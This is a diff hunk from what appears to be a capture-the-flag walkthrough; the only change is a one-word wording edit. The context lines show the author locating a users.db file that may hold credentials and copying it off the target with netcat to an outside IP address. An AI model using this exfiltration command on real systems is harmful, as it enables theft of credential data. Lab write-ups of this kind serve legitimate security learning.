@@ -373,7 +373,7 @@ _=/usr/bin/xxd
 
 I find `/home/app/app/instance/users.db` interesting, if the `gael` user has configured the app, his credentials might be in there.
 
-With this in mind, I transfer the database file to my machine:
+With that in mind, I transfer the database file to my machine:
 ```
 nc -lvp 9999 > users.db # My machine
 cat /home/app/app/instance/users.db | nc 10.10.14.9 9999 # Remote box
